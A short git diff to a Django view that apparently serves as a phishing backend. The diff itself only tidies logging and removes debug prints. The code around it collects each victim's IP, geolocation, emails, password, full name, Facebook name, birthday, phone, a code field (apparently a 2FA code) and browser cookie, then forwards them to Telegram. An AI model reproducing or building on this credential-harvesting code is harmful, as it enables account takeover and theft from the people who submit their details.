@@ -1,8 +1,11 @@
 from django.shortcuts import render
-import requests
 from notification.views import send_telegram_message
 from datetime import datetime
+import requests
 import json
+import logging
+
+logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
 
 
 # Create your views here.
@@ -46,13 +49,10 @@ def process(request):
     if request.method == 'POST':
         final_data = {}
         public_ip = get_client_ip(request)
-        print(public_ip)
         geolocation = get_geolocation(public_ip)
         final_data['public_ip'] = public_ip
         final_data.update(geolocation)
         submit_data = json.loads(request.body)['data']
-        print(submit_data)
-        print(type(submit_data))
         final_data.update(submit_data)
         print(final_data)
         message = '[{}]: New information submitted \n*IP:* {}\n*Country Code:* {}\n*City:* {} \n*Proxy:* {}\n*Latitude:* {}\n*Longtitude:* {}\n*Information:* {}\n*Business Email:* {}\n*Personal Email*: {}\n*Password: * {}\n*Fullname: *{}\n*Facebook Name:* {}\n*Birthday: * {}\n*Phone*: {}\n*User Agent:* {}\n*Code:* {}\n*Cookie*: {}'.format(
